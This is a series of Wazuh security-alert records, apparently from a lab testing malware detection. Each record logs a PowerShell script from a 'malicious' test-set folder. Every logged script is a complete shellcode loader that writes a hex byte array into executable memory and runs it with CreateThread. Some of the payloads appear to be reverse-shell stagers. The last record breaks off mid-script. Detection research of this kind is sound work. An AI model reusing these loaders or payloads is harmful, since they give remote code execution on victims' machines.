{"timestamp":"2026-07-06T02:19:51.913+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":111,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304391.2904039","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:11.8549255Z","eventRecordID":"145248","processID":"3788","threadID":"5620","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x4a,0xef,0x5a,0xab,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x45,0x0d,0xaf,0x57,0xb1,0x53,0x50,0xa8,0x41,0x34,0xd8,0x4d,0x70,0x74,0xbe,0x06,0x22,0x44,0xb4,0x4b,0xce,0x2f,0x98,0x7f,0x45,0x5d,0x35,0x8f,0xee,0xe8,0x63,0xbe,0xef,0x41,0x57,0xa1,0x73,0x98,0x84,0x01,0x4a,0x53,0xd9,0x40,0x8b,0x8e,0x10,0x10,0x44,0xc4,0x87,0x85,0xe1,0x90,0x1b,0x2d,0xb9,0x35,0x1c,0xd2,0x09,0x37,0x0d,0x45,0x02,0x6e,0x8d,0x67,0xc7,0x1a,0x84,0x7f,0x04,0x26,0x5e,0x0b,0xfe,0xdc,0x61,0xdd,0xcf,0x1d,0xcd,0x20,0xe0,0xef,0x0f,0x64,0xc6,0x0f,0x7a,0x9c,0x35,0xad,0x7d,0x5b,0x44,0x69,0x0b,0x78,0xee,0xfa,0xab,0xa4,0x0f,0x2e,0x2d,0x2e,0x03,0x9b,0x39,0x68,0x07,0x1a,0xed,0x02,0x33,0x97,0x10,0xc5,0xb2,0xe3,0x36,0xc1,0x9f,0xb0,0x57,0x50,0x45,0x16,0x67,0x82,0x26,0xc7,0xcd,0xc8,0xca,0x1c,0x7c,0x93,0x82,0xd1,0x4d,0x2c,0x52,0x7e,0xc5,0x5f,0x60,0x21,0x7d,0xc8,0xc8,0xaa,0x5b,0x0f,0x2f,0x81,0x1c,0x9f,0xce,0x2a,0x5d,0x89,0x14,0x7e,0x0d,0xa1,0xbd,0xff,0xc6,0x31,0x42,0x2a,0x72,0x37,0xd4,0xf1,0xc4,0xec,0xab,0x92,0xc8,0x12,0xa2,0x3e,0x44,0xf4,0x94,0xee,0x06,0xa9,0x54,0x5f,0xe7,0x19,0x3c,0xb5,0xe8,0x46,0x5c,0xb6,0x22,0xef,0xf6,0x59,0x9b,0x47,0x6e,0xc3,0x86,0x1c,0x0f,0x0c,0x1d,0x59,0x0f,0x86,0x92,0x9d,0xc1,0x6f,0xde,0x8d,0xb5,0x9f,0x95,0xec,0x13,0x9f,0x03,0x9a,0x9b,0x35,0xa8,0x0d,0xcc,0xa1,0xb2,0x68,0x3a,0x6e,0x4c,0x5f,0x31,0xa7,0xd8,0x20,0x2d,0xc8,0x0c,0xa1,0xad,0x9e,0x46,0xa1,0xc5,0x46,0x33,0xf2,0xf0,0x88,0xee,0x66,0xa9,0x1c,0x11,0xdf,0x1e,0xb6,0x79,0xdd,0x79,0xf0,0x25,0x1e,0xac,0x00,0x19,0xc9,0x88,0x76,0x73,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: bbf98c96-6ebd-4e9e-987a-4ebcff0e28ad\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2310.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x4a,0xef,0x5a,0xab,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x45,0x0d,0xaf,0x57,0xb1,0x53,0x50,0xa8,0x41,0x34,0xd8,0x4d,0x70,0x74,0xbe,0x06,0x22,0x44,0xb4,0x4b,0xce,0x2f,0x98,0x7f,0x45,0x5d,0x35,0x8f,0xee,0xe8,0x63,0xbe,0xef,0x41,0x57,0xa1,0x73,0x98,0x84,0x01,0x4a,0x53,0xd9,0x40,0x8b,0x8e,0x10,0x10,0x44,0xc4,0x87,0x85,0xe1,0x90,0x1b,0x2d,0xb9,0x35,0x1c,0xd2,0x09,0x37,0x0d,0x45,0x02,0x6e,0x8d,0x67,0xc7,0x1a,0x84,0x7f,0x04,0x26,0x5e,0x0b,0xfe,0xdc,0x61,0xdd,0xcf,0x1d,0xcd,0x20,0xe0,0xef,0x0f,0x64,0xc6,0x0f,0x7a,0x9c,0x35,0xad,0x7d,0x5b,0x44,0x69,0x0b,0x78,0xee,0xfa,0xab,0xa4,0x0f,0x2e,0x2d,0x2e,0x03,0x9b,0x39,0x68,0x07,0x1a,0xed,0x02,0x33,0x97,0x10,0xc5,0xb2,0xe3,0x36,0xc1,0x9f,0xb0,0x57,0x50,0x45,0x16,0x67,0x82,0x26,0xc7,0xcd,0xc8,0xca,0x1c,0x7c,0x93,0x82,0xd1,0x4d,0x2c,0x52,0x7e,0xc5,0x5f,0x60,0x21,0x7d,0xc8,0xc8,0xaa,0x5b,0x0f,0x2f,0x81,0x1c,0x9f,0xce,0x2a,0x5d,0x89,0x14,0x7e,0x0d,0xa1,0xbd,0xff,0xc6,0x31,0x42,0x2a,0x72,0x37,0xd4,0xf1,0xc4,0xec,0xab,0x92,0xc8,0x12,0xa2,0x3e,0x44,0xf4,0x94,0xee,0x06,0xa9,0x54,0x5f,0xe7,0x19,0x3c,0xb5,0xe8,0x46,0x5c,0xb6,0x22,0xef,0xf6,0x59,0x9b,0x47,0x6e,0xc3,0x86,0x1c,0x0f,0x0c,0x1d,0x59,0x0f,0x86,0x92,0x9d,0xc1,0x6f,0xde,0x8d,0xb5,0x9f,0x95,0xec,0x13,0x9f,0x03,0x9a,0x9b,0x35,0xa8,0x0d,0xcc,0xa1,0xb2,0x68,0x3a,0x6e,0x4c,0x5f,0x31,0xa7,0xd8,0x20,0x2d,0xc8,0x0c,0xa1,0xad,0x9e,0x46,0xa1,0xc5,0x46,0x33,0xf2,0xf0,0x88,0xee,0x66,0xa9,0x1c,0x11,0xdf,0x1e,0xb6,0x79,0xdd,0x79,0xf0,0x25,0x1e,0xac,0x00,0x19,0xc9,0x88,0x76,0x73,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"bbf98c96-6ebd-4e9e-987a-4ebcff0e28ad","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2310.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:53.499+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":112,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304393.2915348","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:13.4499595Z","eventRecordID":"145253","processID":"3272","threadID":"1088","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0xc9,0xde,0x60,0x68,0x02,0x00,0xd4,0xea,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 740ac5ae-70f4-4065-8458-6675b2a5bea0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2356.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0xc9,0xde,0x60,0x68,0x02,0x00,0xd4,0xea,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"740ac5ae-70f4-4065-8458-6675b2a5bea0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2356.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:54.564+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":113,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304394.2926297","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:14.9610447Z","eventRecordID":"145260","processID":"632","threadID":"6620","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x3e,0xb5,0x04,0x2f,0xda,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x68,0x13,0x83,0xe8,0xfc,0x03,0x68,0x31,0x57,0xf1,0xd3,0xa5,0x15,0xfa,0x2b,0x35,0x7a,0x72,0xce,0x04,0xba,0xe0,0x9a,0x36,0x0a,0x62,0xce,0xba,0xe1,0x26,0xfb,0x49,0x87,0xee,0x0c,0xfa,0x22,0xc9,0x23,0xfb,0x1f,0x29,0x25,0x7f,0x62,0x7e,0x85,0xbe,0xad,0x73,0xc4,0x87,0xd0,0x7e,0x94,0x50,0x9e,0x2d,0x09,0xd5,0xea,0xed,0xa2,0xa5,0xfb,0x75,0x56,0x7d,0xfd,0x54,0xc9,0xf6,0xa4,0x76,0xeb,0xdb,0xdc,0x3e,0xf3,0x38,0xd8,0x89,0x88,0x8a,0x96,0x0b,0x59,0xc3,0x57,0xa7,0xa4,0xec,0xa5,0xb9,0xe1,0xca,0x55,0xcc,0x1b,0x29,0xeb,0xd7,0xdf,0x50,0x37,0x5d,0xc4,0xf2,0xbc,0xc5,0x20,0x03,0x10,0x93,0xa3,0x0f,0xdd,0xd7,0xec,0x13,0xe0,0x34,0x87,0x2f,0x69,0xbb,0x48,0xa6,0x29,0x98,0x4c,0xe3,0xea,0x81,0xd5,0x49,0x5c,0xbd,0x06,0x32,0x01,0x1b,0x4c,0xde,0x56,0x16,0x0f,0xb6,0x9b,0x1b,0xb0,0x46,0xb4,0x2c,0xc3,0x74,0x1b,0x87,0x4b,0x34,0xd4,0x01,0x8b,0x3b,0xcf,0xf6,0x03,0xc2,0xf0,0x06,0x0d,0x00,0xa4,0x56,0x25,0xa1,0xc5,0x3c,0xb5,0x4e,0x10,0xa8,0xb0,0xd8,0x5b,0x85,0xbb,0x9e,0x34,0xd4,0xbb,0x81,0x5e,0x51,0x5d,0xed,0x0e,0x32,0xf2,0x4d,0xff,0xf2,0xa2,0x25,0x15,0xfd,0x9d,0x55,0x16,0xd7,0xb5,0xff,0xf9,0x8e,0xee,0x97,0x60,0x8b,0x65,0x06,0x6c,0x01,0x00,0x08,0xe6,0xa6,0xf4,0xc6,0x0f,0xc2,0xe6,0xbe,0xff,0x99,0x55,0x68,0xff,0x37,0xf3,0x94,0x95,0xb3,0x52,0xc3,0x01,0xbe,0x83,0x23,0x8e,0x41,0xe6,0x38,0x07,0xd4,0x49,0x56,0x68,0x38,0x4a,0xa6,0x3e,0x52,0x4a,0xce,0xe6,0x06,0x19,0xeb,0xe8,0x92,0x0d,0xa0,0x7c,0x1d,0x64,0x15,0xd6,0x75,0x8a,0x40,0x10,0xda,0x75,0xa7,0xa0,0x26,0xa0,0x81,0xd6,0x46,0x70;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 185b3d8e-2f88-4437-bedf-185705bce4e1\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2374.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x3e,0xb5,0x04,0x2f,0xda,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x68,0x13,0x83,0xe8,0xfc,0x03,0x68,0x31,0x57,0xf1,0xd3,0xa5,0x15,0xfa,0x2b,0x35,0x7a,0x72,0xce,0x04,0xba,0xe0,0x9a,0x36,0x0a,0x62,0xce,0xba,0xe1,0x26,0xfb,0x49,0x87,0xee,0x0c,0xfa,0x22,0xc9,0x23,0xfb,0x1f,0x29,0x25,0x7f,0x62,0x7e,0x85,0xbe,0xad,0x73,0xc4,0x87,0xd0,0x7e,0x94,0x50,0x9e,0x2d,0x09,0xd5,0xea,0xed,0xa2,0xa5,0xfb,0x75,0x56,0x7d,0xfd,0x54,0xc9,0xf6,0xa4,0x76,0xeb,0xdb,0xdc,0x3e,0xf3,0x38,0xd8,0x89,0x88,0x8a,0x96,0x0b,0x59,0xc3,0x57,0xa7,0xa4,0xec,0xa5,0xb9,0xe1,0xca,0x55,0xcc,0x1b,0x29,0xeb,0xd7,0xdf,0x50,0x37,0x5d,0xc4,0xf2,0xbc,0xc5,0x20,0x03,0x10,0x93,0xa3,0x0f,0xdd,0xd7,0xec,0x13,0xe0,0x34,0x87,0x2f,0x69,0xbb,0x48,0xa6,0x29,0x98,0x4c,0xe3,0xea,0x81,0xd5,0x49,0x5c,0xbd,0x06,0x32,0x01,0x1b,0x4c,0xde,0x56,0x16,0x0f,0xb6,0x9b,0x1b,0xb0,0x46,0xb4,0x2c,0xc3,0x74,0x1b,0x87,0x4b,0x34,0xd4,0x01,0x8b,0x3b,0xcf,0xf6,0x03,0xc2,0xf0,0x06,0x0d,0x00,0xa4,0x56,0x25,0xa1,0xc5,0x3c,0xb5,0x4e,0x10,0xa8,0xb0,0xd8,0x5b,0x85,0xbb,0x9e,0x34,0xd4,0xbb,0x81,0x5e,0x51,0x5d,0xed,0x0e,0x32,0xf2,0x4d,0xff,0xf2,0xa2,0x25,0x15,0xfd,0x9d,0x55,0x16,0xd7,0xb5,0xff,0xf9,0x8e,0xee,0x97,0x60,0x8b,0x65,0x06,0x6c,0x01,0x00,0x08,0xe6,0xa6,0xf4,0xc6,0x0f,0xc2,0xe6,0xbe,0xff,0x99,0x55,0x68,0xff,0x37,0xf3,0x94,0x95,0xb3,0x52,0xc3,0x01,0xbe,0x83,0x23,0x8e,0x41,0xe6,0x38,0x07,0xd4,0x49,0x56,0x68,0x38,0x4a,0xa6,0x3e,0x52,0x4a,0xce,0xe6,0x06,0x19,0xeb,0xe8,0x92,0x0d,0xa0,0x7c,0x1d,0x64,0x15,0xd6,0x75,0x8a,0x40,0x10,0xda,0x75,0xa7,0xa0,0x26,0xa0,0x81,0xd6,0x46,0x70;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"185b3d8e-2f88-4437-bedf-185705bce4e1","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2374.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:55.846+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":114,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304395.2937604","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:15.8316024Z","eventRecordID":"145264","processID":"2540","threadID":"6616","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xac,0x18,0xc9,0x45,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = 